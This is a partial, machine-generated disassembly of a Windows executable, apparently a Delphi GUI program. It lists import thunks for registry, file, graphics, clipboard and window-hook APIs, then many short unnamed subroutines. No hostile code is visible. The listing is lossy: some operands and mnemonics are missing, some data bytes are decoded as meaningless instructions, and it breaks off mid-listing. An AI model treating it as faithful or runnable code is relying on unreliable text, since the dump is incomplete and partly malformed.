jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
DeleteFileA
jmp [ __import_lookup_table_6(kernel32:DeleteFileA) ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4062f8
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcmpA
jmp [ __import_lookup_table_6(kernel32:lstrcmpA) ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GdiFlush
jmp [ __import_lookup_table_8(gdi32:GdiFlush) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetTextExtentPointA
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPointA) ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polygon
jmp [ __import_lookup_table_8(gdi32:Polygon) ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
DrawStateA
jmp [ __import_lookup_table_9(user32:DrawStateA) ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ __import_lookup_table_9(user32:GetClipboardData) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ __import_lookup_table_9(user32:GetCursorPos) ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetLastInputInfo
jmp [ __import_lookup_table_9(user32:GetLastInputInfo) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
HideCaret
jmp [ HideCaret@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetClipboardData
jmp [ __import_lookup_table_9(user32:SetClipboardData) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCaret
jmp [ __import_lookup_table_9(user32:ShowCaret) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406af4
call GetTickCount
retn
sub_406afc
xchg edx eax
call sub_4028c8
retn
sub_406b04
xor eax eax
retn
sub_406b08
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406b18
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406b34
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406b48
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406b70
retn
sub_406b74
shr eax 0x8
retn
sub_406b78
shr eax 0x10
retn
sub_406ba8
call sub_406ae8
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406d85
jmp sub_4038bc
sub_406d8c
pop ebp
retn
sub_406d90
sub [ rw-data ] 0x1
retn
sub_406dbd
jmp sub_4038bc
sub_406dc4
pop ebp
retn
sub_406dc8
sub [ rw-data ] 0x1
retn
sub_4070d5
jmp sub_4038bc
sub_4070dc
pop ebp
retn
sub_4070e0
sub [ rw-data ] 0x1
retn
sub_407bbd
add eax 0xffffffd4
jmp sub_40d1f8
sub_407bcf
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405888
sub_407bd9
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40589c
sub_407f70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407f38
test eax eax
sete al
pop esi
pop ebx
retn
sub_4084ee
jmp sub_4038bc
sub_4084f5
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4084fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408488
pop esi
pop ebx
retn
sub_40858c
call sub_408568
retn
sub_408624
push eax
call CloseHandle
retn
sub_408694
push ebx
mov ebx eax
mov eax ebx
call sub_40862c
inc eax
setne al
pop ebx
retn
sub_4086a4
push ebx
mov ebx eax
mov eax ebx
call sub_404378
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_408884
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408898
push esi
mov esi eax
xchg edx eax
call sub_4028c8
mov eax esi
pop esi
retn
sub_408a58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040b0
pop esi
pop ebx
retn
sub_408a6c
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026cc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408a80
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408ab8
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026ec
sub_408b20
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402828
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408b44
push ebx
mov ebx eax
mov eax ebx
call sub_403eb8
pop ebx
retn
sub_408ea7
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403eb8
pop eax
pop ebx
retn
sub_40915f
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_4092ba
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409617
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409617
sub_4096d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404378
mov edx esi
xor ecx ecx
call sub_409560
pop esi
pop ebx
retn
sub_409748
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404378
mov edx esi
mov cl 0x1
call sub_409560
pop esi
pop ebx
retn
sub_409dc2
jmp sub_4038bc
sub_409dc9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409eba
jmp sub_4038bc
sub_409ec1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a665
jmp sub_4038bc
sub_40a66c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a6f4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a698
pop ebp
retn 0x8
sub_40a839
jmp sub_4038bc
sub_40a840
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ace3
jmp sub_4038bc
sub_40acea
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b203
jmp sub_4038bc
sub_40b20a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b2b5
jmp sub_4038bc
sub_40b2bc
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b35f
jmp sub_4038bc
sub_40b366
pop esi
pop ecx
pop ebp
retn
sub_40b542
jmp sub_4038bc
sub_40b549
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b5a0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b892
jmp sub_4038bc
sub_40b960
jmp sub_4038bc
sub_40b988
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4030dc
sub_40bb24
jmp sub_4038bc
sub_40bb2b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb34
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4038f4
sub_40bb41
retn
sub_40bb44
push ebp
mov ebp esp
call sub_40ba88
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bb34
pop ebp
retn 0x4
sub_40bb60
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
retn
sub_40bbf8
push ebx
mov ebx eax
mov eax ebx
call sub_40bb78
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bdcb
jmp sub_4038bc
sub_40bdd2
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be97
jmp sub_4038bc
sub_40be9e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bea8
call sub_40b734
mov eax 0x1
call sub_403ea0
sub_40c02c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c105
jmp sub_4038bc
sub_40c122
jmp sub_4038bc
sub_40c129
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c138
push 0x0
call MessageBeep
retn
sub_40c1dc
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c140
mov ecx eax
sub_40c3c8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c3e8
push eax
call CharNextA
retn
sub_40c710
jmp sub_4038bc
sub_40c717
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c780
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cbd7
jmp sub_4038bc
sub_40cbde
pop ebx
mov esp ebp
pop ebp
retn
sub_40cda7
jmp sub_4038bc
sub_40cdae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40ce50
jmp sub_4038bc
sub_40ce57
pop ebx
mov esp ebp
pop ebp
retn
sub_40ce5c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cdc0
sub_40ce6c
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40ce88
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026ec
pop ebx
retn
sub_40cf10
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cf1c
xchg [ eax ] edx
mov eax edx
retn
sub_40cf7c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d00c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d124
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d14c
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d3c7
jmp sub_4038bc
sub_40d3ce
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d43c
jmp sub_4038bc
sub_40d443
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d461
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d45a
jmp sub_4038bc
sub_40d461
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d46c
sbb eax 0x4000000
mov bl 0x48
add [ eax ] bh
retn
sub_40d476
dec eax
add ah bh
mov dl 0x48
add [ edx + eax * 8 + 0x48 ] al
add ah dh
mov dl 0x48
add [ eax - 0x13ffb740 ] bl
mov dl 0x48
add [ eax - 0x1bffb73d ] cl
mov dl 0x48
add al al
retn
sub_40d70d
mov cl 0x48
add al dl
retn 0x48
sub_40d714
add [ eax ] al
add [ eax ] al
mov [ ecx - 0x3b67ffb8 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x48 ] ah
add [ eax ] ah
retn 0x48
sub_40d8b1
jmp sub_4038bc
sub_40d8b8
pop ebp
retn
sub_40d924
jmp sub_4038bc
sub_40d92b
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d9a4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40da0a
jmp sub_4038bc
sub_40da11
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da76
jmp sub_4038bc
sub_40da7d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dae2
jmp sub_4038bc
sub_40dae9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db4e
jmp sub_4038bc
sub_40db55
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dbba
jmp sub_4038bc
sub_40dbc1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc39
jmp sub_4038bc
sub_40dc40
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dcac
jmp sub_4038bc
sub_40dcb3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dd1c
jmp sub_4038bc
sub_40dd23
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dd90
jmp sub_4038bc
sub_40dd97
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40e11d
jmp sub_4038bc
sub_40e124
pop ebp
retn
sub_40e128
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40ddec
sub_40e139
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e7c2
jmp sub_4038bc
sub_40e7c9
pop ecx
pop ebp
retn
sub_40e85b
jmp sub_4038bc
sub_40e862
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e8b2
jmp sub_4038bc
sub_40e8b9
pop ecx
pop ebp
retn
sub_40e906
jmp sub_4038bc
sub_40e90d
pop ecx
pop ebp
retn
sub_40e99f
jmp sub_4038bc
sub_40e9a6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e9f6
jmp sub_4038bc
sub_40e9fd
pop ecx
pop ebp
retn
sub_40ec45
jmp sub_4038bc
sub_40ec4c
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed62
jmp sub_4038bc
sub_40ed69
pop ecx
pop ebp
retn
sub_40ed6c
push ebx
mov ebx eax
mov eax ebx
call sub_40f004
mov [ ebx ] 0x1
pop ebx
retn
sub_40f018
push eax
call sub_40f004
pop eax
retn
sub_40f278
call sub_40f32c
retn
sub_40f3cc
jmp sub_4038bc
sub_40f3d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f41a
jmp sub_4038bc
sub_40f421
pop ebx
pop ecx
pop ebp
retn
sub_40f466
jmp sub_4038bc
sub_40f46d
pop ebx
pop ecx
pop ebp
retn
sub_40f4b2
jmp sub_4038bc
sub_40f4b9
pop ebx
pop ecx
pop ebp
retn
sub_40f4fe
jmp sub_4038bc
sub_40f505
pop ebx
pop ecx
pop ebp
retn
sub_40f8c7
jmp sub_4038bc
sub_40f8ce
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f968
jmp sub_4038bc
sub_40f96f
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fddd
jmp sub_403608
sub_40fe98
jmp sub_403608
sub_40ff3f
jmp sub_403608
sub_410038
jmp sub_403608
sub_410111
jmp sub_403608
sub_4101f9
jmp sub_403608
sub_4103b6
jmp sub_4038bc
sub_4103bd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41041f
jmp sub_4038bc
sub_410426
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41088c
jmp sub_403608
sub_41097b
jmp sub_4038bc
sub_410982
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410a20
jmp sub_4038bc
sub_410a27
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410dc4
call sub_410a7c
neg al
sbb eax eax
neg eax
retn
sub_410e85
jmp sub_4038bc
sub_410e8c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410f35
